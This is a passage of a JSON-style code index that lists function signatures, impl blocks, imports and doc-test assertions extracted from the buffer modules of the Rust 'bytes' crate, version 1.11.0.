          "fn get_u128_ne(&mut self) -> u128 {",
          "fn get_i128(&mut self) -> i128 {",
          "fn get_i128_le(&mut self) -> i128 {",
          "fn get_i128_ne(&mut self) -> i128 {",
          "fn get_uint(&mut self, nbytes: usize) -> u64 {",
          "fn get_uint_le(&mut self, nbytes: usize) -> u64 {",
          "fn get_uint_ne(&mut self, nbytes: usize) -> u64 {",
          "fn get_int(&mut self, nbytes: usize) -> i64 {",
          "fn get_int_le(&mut self, nbytes: usize) -> i64 {",
          "fn get_int_ne(&mut self, nbytes: usize) -> i64 {",
          "fn get_f32(&mut self) -> f32 {",
          "fn get_f32_le(&mut self) -> f32 {",
          "fn get_f32_ne(&mut self) -> f32 {",
          "fn get_f64(&mut self) -> f64 {",
          "fn get_f64_le(&mut self) -> f64 {",
          "fn get_f64_ne(&mut self) -> f64 {",
          "fn try_copy_to_slice(&mut self, dst: &mut [u8]) -> Result<(), TryGetError> {",
          "fn try_get_u8(&mut self) -> Result<u8, TryGetError> {",
          "fn try_get_i8(&mut self) -> Result<i8, TryGetError> {",
          "fn try_get_u16(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_u16_le(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_u16_ne(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_i16(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_i16_le(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_i16_ne(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_u32(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_u32_le(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_u32_ne(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_i32(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_i32_le(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_i32_ne(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_u64(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_u64_le(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_u64_ne(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_i64(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_i64_le(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_i64_ne(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_u128(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_u128_le(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_u128_ne(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_i128(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_i128_le(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_i128_ne(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_uint(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_uint_le(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_uint_ne(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_int(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_int_le(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_int_ne(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_f32(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f32_le(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f32_ne(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f64(&mut self) -> Result<f64, TryGetError> {",
          "fn try_get_f64_le(&mut self) -> Result<f64, TryGetError> {",
          "fn try_get_f64_ne(&mut self) -> Result<f64, TryGetError> {",
          "fn copy_to_bytes(&mut self, len: usize) -> crate::Bytes {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn copy_to_slice(&mut self, dst: &mut [u8]) {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn _assert_trait_object(_b: &dyn Buf) {}"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Buf for &[u8] {"
        ],
        "uses": [
          "use crate::buf::{reader, Reader};",
          "use crate::buf::{take, Chain, Take};",
          "use crate::{min_u64_usize, saturating_sub_usize_u64};",
          "use crate::{panic_advance, panic_does_not_fit, TryGetError};",
          "use std::io::IoSlice;",
          "use alloc::boxed::Box;",
          "use super::BufMut;"
        ],
        "macros": [
          "return (|| buf_try_get_impl!($this, $typ::$conv))()",
          "return (|| buf_try_get_impl!(le => $this, $typ, $len_to_read))()",
          "return (|| buf_try_get_impl!(be => $this, $typ, $len_to_read))()",
          "/// assert_eq!(b'h', buf.get_u8());",
          "/// assert_eq!(b'e', buf.get_u8());",
          "/// assert_eq!(b'l', buf.get_u8());",
          "/// assert_eq!(&rest[..], &b\"lo world\"[..]);",
          "/// assert_eq!(buf.remaining(), 11);",
          "/// assert_eq!(buf.remaining(), 10);",
          "/// assert_eq!(buf.chunk(), &b\"hello world\"[..]);",
          "/// assert_eq!(buf.chunk(), &b\"world\"[..]);",
          "/// assert_eq!(buf.chunk(), &b\"hello world\"[..]);",
          "/// assert_eq!(buf.chunk(), &b\"world\"[..]);",
          "/// assert!(buf.has_remaining());",
          "/// assert!(!buf.has_remaining());",
          "/// assert_eq!(&b\"hello\"[..], &dst);",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(8, buf.get_u8());",
          "/// assert_eq!(8, buf.get_i8());",
          "/// assert_eq!(0x0809, buf.get_u16());",
          "buf_get_impl!(self, u16::from_be_bytes);",
          "/// assert_eq!(0x0809, buf.get_u16_le());",
          "buf_get_impl!(self, u16::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0809, buf.get_u16_ne());",
          "buf_get_impl!(self, u16::from_ne_bytes);",
          "/// assert_eq!(0x0809, buf.get_i16());",
          "buf_get_impl!(self, i16::from_be_bytes);",
          "/// assert_eq!(0x0809, buf.get_i16_le());",
          "buf_get_impl!(self, i16::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0809, buf.get_i16_ne());",
          "buf_get_impl!(self, i16::from_ne_bytes);",
          "/// assert_eq!(0x0809A0A1, buf.get_u32());",
          "buf_get_impl!(self, u32::from_be_bytes);",
          "/// assert_eq!(0x0809A0A1, buf.get_u32_le());",
          "buf_get_impl!(self, u32::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0809A0A1, buf.get_u32_ne());",
          "buf_get_impl!(self, u32::from_ne_bytes);",
          "/// assert_eq!(0x0809A0A1, buf.get_i32());",
          "buf_get_impl!(self, i32::from_be_bytes);",
          "/// assert_eq!(0x0809A0A1, buf.get_i32_le());",
          "buf_get_impl!(self, i32::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0809A0A1, buf.get_i32_ne());",
          "buf_get_impl!(self, i32::from_ne_bytes);",
          "/// assert_eq!(0x0102030405060708, buf.get_u64());",
          "buf_get_impl!(self, u64::from_be_bytes);",
          "/// assert_eq!(0x0102030405060708, buf.get_u64_le());",
          "buf_get_impl!(self, u64::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0102030405060708, buf.get_u64_ne());",
          "buf_get_impl!(self, u64::from_ne_bytes);",
          "/// assert_eq!(0x0102030405060708, buf.get_i64());",
          "buf_get_impl!(self, i64::from_be_bytes);",
          "/// assert_eq!(0x0102030405060708, buf.get_i64_le());",
          "buf_get_impl!(self, i64::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0102030405060708, buf.get_i64_ne());",
          "buf_get_impl!(self, i64::from_ne_bytes);",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_u128());",
          "buf_get_impl!(self, u128::from_be_bytes);",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_u128_le());",
          "buf_get_impl!(self, u128::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_u128_ne());",
          "buf_get_impl!(self, u128::from_ne_bytes);",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_i128());",
          "buf_get_impl!(self, i128::from_be_bytes);",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_i128_le());",
          "buf_get_impl!(self, i128::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_i128_ne());",
          "buf_get_impl!(self, i128::from_ne_bytes);",
          "/// assert_eq!(0x010203, buf.get_uint(3));",
          "buf_get_impl!(be => self, u64, nbytes);",
          "/// assert_eq!(0x010203, buf.get_uint_le(3));",
          "buf_get_impl!(le => self, u64, nbytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x010203, buf.get_uint_ne(3));",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x010203, buf.get_int(3));",
          "/// assert_eq!(0x010203, buf.get_int_le(3));",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x010203, buf.get_int_ne(3));",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f32, buf.get_f32());",
          "/// assert_eq!(1.2f32, buf.get_f32_le());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f32, buf.get_f32_ne());",
          "/// assert_eq!(1.2f64, buf.get_f64());",
          "/// assert_eq!(1.2f64, buf.get_f64_le());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f64, buf.get_f64_ne());",
          "/// assert_eq!(Ok(()), buf.try_copy_to_slice(&mut dst));",
          "/// assert_eq!(&b\"hello\"[..], &dst);",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 12, available: 11}), buf.try_copy_to_s",
          "/// assert_eq!(11, buf.remaining());",
          "/// assert_eq!(Ok(0x08_u8), buf.try_get_u8());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 1, available: 0}), buf.try_get_u8());",
          "/// assert_eq!(Ok(0x08_i8), buf.try_get_i8());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 1, available: 0}), buf.try_get_i8());",
          "/// assert_eq!(Ok(0x0809_u16), buf.try_get_u16());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_u16());",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, u16::from_be_bytes)",
          "/// assert_eq!(Ok(0x0809_u16), buf.try_get_u16_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_u16_le(",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, u16::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0809_u16), buf.try_get_u16_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_u16_ne(",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, u16::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0809_i16), buf.try_get_i16());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_i16());",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, i16::from_be_bytes)",
          "/// assert_eq!(Ok(0x0809_i16), buf.try_get_i16_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_i16_le(",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, i16::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0809_i16), buf.try_get_i16_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_i16_ne(",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, i16::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0809A0A1), buf.try_get_u32());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_u32());",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, u32::from_be_bytes)",
          "/// assert_eq!(Ok(0x0809A0A1_u32), buf.try_get_u32_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_u32_le(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, u32::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0809A0A1_u32), buf.try_get_u32_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_u32_ne(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, u32::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0809A0A1_i32), buf.try_get_i32());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_i32());",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, i32::from_be_bytes)",
          "/// assert_eq!(Ok(0x0809A0A1_i32), buf.try_get_i32_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_i32_le(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, i32::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0809A0A1_i32), buf.try_get_i32_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_i32_ne(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, i32::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0102030405060708_u64), buf.try_get_u64());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_u64());",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, u64::from_be_bytes)",
          "/// assert_eq!(Ok(0x0102030405060708_u64), buf.try_get_u64_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_u64_le(",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, u64::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0102030405060708_u64), buf.try_get_u64_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_u64_ne(",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, u64::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0102030405060708_i64), buf.try_get_i64());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_i64());",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, i64::from_be_bytes)",
          "/// assert_eq!(Ok(0x0102030405060708_i64), buf.try_get_i64_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_i64_le(",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, i64::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0102030405060708_i64), buf.try_get_i64_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_i64_ne(",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, i64::from_ne_bytes)",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_u128), buf.try_get_u128());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_u128(",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, u128::from_be_bytes)",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_u128), buf.try_get_u128_le(",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_u128_",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, u128::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_u128), buf.try_get_u128_ne(",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_u128_",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, u128::from_ne_bytes)",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_i128), buf.try_get_i128());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_i128(",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, i128::from_be_bytes)",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_i128), buf.try_get_i128_le(",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_i128_",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, i128::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_i128), buf.try_get_i128_ne(",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_i128_",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, i128::from_ne_bytes)",
          "/// assert_eq!(Ok(0x010203_u64), buf.try_get_uint(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_uint(4)",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(be => self, u64, nbytes);",
          "/// assert_eq!(Ok(0x010203_u64), buf.try_get_uint_le(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_uint_le",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(le => self, u64, nbytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x010203_u64), buf.try_get_uint_ne(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_uint_ne",
          "/// assert_eq!(3, buf.remaining());",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x010203_i64), buf.try_get_int(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_int(4))",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(be => self, i64, nbytes);",
          "/// assert_eq!(Ok(0x010203_i64), buf.try_get_int_le(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_int_le(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(le => self, i64, nbytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x010203_i64), buf.try_get_int_ne(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_int_ne(",
          "/// assert_eq!(3, buf.remaining());",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f32, buf.get_f32());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_f32());",
          "/// assert_eq!(3, buf.remaining());",
          "/// assert_eq!(1.2f32, buf.get_f32_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_f32_le(",
          "/// assert_eq!(3, buf.remaining());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f32, buf.get_f32_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_f32_ne(",
          "/// assert_eq!(3, buf.remaining());",
          "/// assert_eq!(1.2f64, buf.get_f64());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_f64());",
          "/// assert_eq!(7, buf.remaining());",
          "/// assert_eq!(1.2f64, buf.get_f64_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_f64_le(",
          "/// assert_eq!(7, buf.remaining());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f64, buf.get_f64_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_f64_ne(",
          "/// assert_eq!(7, buf.remaining());",
          "/// assert_eq!(&bytes[..], &b\"hello\"[..]);",
          "/// assert_eq!(dst, b\"hello\");",
          "/// assert_eq!(dst, b\" world\");",
          "/// assert_eq!(full.chunk(), b\"hello world\");",
          "/// assert_eq!(11, num);",
          "/// assert_eq!(&dst[..11], &b\"hello world\"[..]);",
          "deref_forward_buf!();",
          "deref_forward_buf!();"
        ],
        "derives": [],
        "error_handling": 39
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/vec_deque.rs",
        "function_defs": [
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn chunks_vectored<'a>(&'a self, dst: &mut [io::IoSlice<'a>]) -> usize {",
          "fn advance(&mut self, cnt: usize) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Buf for VecDeque<u8> {"
        ],
        "uses": [
          "use alloc::collections::VecDeque;",
          "use std::io;",
          "use super::Buf;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/uninit_slice.rs",
        "function_defs": [
          "fn uninit_ref(slice: &[MaybeUninit<u8>]) -> &UninitSlice {",
          "fn fmt(&self, fmt: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(slice: &'a mut [u8]) -> Self {",
          "fn from(slice: &'a mut [MaybeUninit<u8>]) -> Self {",
          "fn index(&self, index: $t) -> &UninitSlice {",
          "fn index_mut(&mut self, index: $t) -> &mut UninitSlice {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl UninitSlice {",
          "impl fmt::Debug for UninitSlice {",
          "impl Index<$t> for UninitSlice {",
          "impl IndexMut<$t> for UninitSlice {"
        ],
        "uses": [
          "use core::fmt;",
          "use core::mem::MaybeUninit;",
          "use core::ops::{",
          "use core::ptr;"
        ],
        "macros": [
          "/// assert_eq!(b\"boo\", &data[..]);",
          "assert!(index < self.len());",
          "/// assert_eq!(b\"bar\", &data[..]);",
          "assert_eq!(self.len(), src.len());",
          "/// assert_eq!(len, 3);",
          "impl_index!("
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/buf_mut.rs",
        "function_defs": [
          "fn remaining_mut(&self) -> usize;",
          "fn has_remaining_mut(&self) -> bool {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice;",
          "fn put<T: super::Buf>(&mut self, mut src: T)",
          "fn put_slice(&mut self, mut src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, mut cnt: usize) {",
          "fn put_u8(&mut self, n: u8) {",
          "fn put_i8(&mut self, n: i8) {",
          "fn put_u16(&mut self, n: u16) {",
          "fn put_u16_le(&mut self, n: u16) {",
          "fn put_u16_ne(&mut self, n: u16) {",
          "fn put_i16(&mut self, n: i16) {",
          "fn put_i16_le(&mut self, n: i16) {",
          "fn put_i16_ne(&mut self, n: i16) {",
          "fn put_u32(&mut self, n: u32) {",
          "fn put_u32_le(&mut self, n: u32) {",
          "fn put_u32_ne(&mut self, n: u32) {",
          "fn put_i32(&mut self, n: i32) {",
          "fn put_i32_le(&mut self, n: i32) {",
          "fn put_i32_ne(&mut self, n: i32) {",
          "fn put_u64(&mut self, n: u64) {",
          "fn put_u64_le(&mut self, n: u64) {",
          "fn put_u64_ne(&mut self, n: u64) {",
          "fn put_i64(&mut self, n: i64) {",
          "fn put_i64_le(&mut self, n: i64) {",
          "fn put_i64_ne(&mut self, n: i64) {",
          "fn put_u128(&mut self, n: u128) {",
          "fn put_u128_le(&mut self, n: u128) {",
          "fn put_u128_ne(&mut self, n: u128) {",
          "fn put_i128(&mut self, n: i128) {",
          "fn put_i128_le(&mut self, n: i128) {",
          "fn put_i128_ne(&mut self, n: i128) {",
          "fn put_uint(&mut self, n: u64, nbytes: usize) {",
          "fn put_uint_le(&mut self, n: u64, nbytes: usize) {",
          "fn put_uint_ne(&mut self, n: u64, nbytes: usize) {",
          "fn put_int(&mut self, n: i64, nbytes: usize) {",
          "fn put_int_le(&mut self, n: i64, nbytes: usize) {",
          "fn put_int_ne(&mut self, n: i64, nbytes: usize) {",
          "fn put_f32(&mut self, n: f32) {",
          "fn put_f32_le(&mut self, n: f32) {",
          "fn put_f32_ne(&mut self, n: f32) {",
          "fn put_f64(&mut self, n: f64) {",
          "fn put_f64_le(&mut self, n: f64) {",
          "fn put_f64_ne(&mut self, n: f64) {",
          "fn limit(self, limit: usize) -> Limit<Self>",
          "fn writer(self) -> Writer<Self>",
          "fn chain_mut<U: BufMut>(self, next: U) -> Chain<Self, U>",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_u8(&mut self, n: u8) {",
          "fn put_i8(&mut self, n: i8) {",
          "fn put_u16(&mut self, n: u16) {",
          "fn put_u16_le(&mut self, n: u16) {",
          "fn put_u16_ne(&mut self, n: u16) {",
          "fn put_i16(&mut self, n: i16) {",
          "fn put_i16_le(&mut self, n: i16) {",
          "fn put_i16_ne(&mut self, n: i16) {",
          "fn put_u32(&mut self, n: u32) {",
          "fn put_u32_le(&mut self, n: u32) {",
          "fn put_u32_ne(&mut self, n: u32) {",
          "fn put_i32(&mut self, n: i32) {",
          "fn put_i32_le(&mut self, n: i32) {",
          "fn put_i32_ne(&mut self, n: i32) {",
          "fn put_u64(&mut self, n: u64) {",
          "fn put_u64_le(&mut self, n: u64) {",
          "fn put_u64_ne(&mut self, n: u64) {",
          "fn put_i64(&mut self, n: i64) {",
          "fn put_i64_le(&mut self, n: i64) {",
          "fn put_i64_ne(&mut self, n: i64) {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, cnt: usize) {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, cnt: usize) {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put<T: super::Buf>(&mut self, mut src: T)",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, cnt: usize) {",
          "fn _assert_trait_object(_b: &dyn BufMut) {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::buf::{limit, Chain, Limit, UninitSlice};",
          "use crate::buf::{writer, Writer};",
          "use crate::{panic_advance, panic_does_not_fit, TryGetError};",
          "use core::{mem, ptr};",
          "use alloc::{boxed::Box, vec::Vec};"
        ],
        "macros": [
          "/// assert_eq!(buf, b\"hello world\");",
          "/// assert_eq!(original_remaining - 5, buf.remaining_mut());",
          "/// assert_eq!(5, buf.len());",
          "/// assert_eq!(buf, b\"hello\");",
          "/// assert!(buf.has_remaining_mut());",
          "/// assert!(!buf.has_remaining_mut());",
          "/// assert_eq!(5, buf.len());",
          "/// assert_eq!(buf, b\"hello\");",
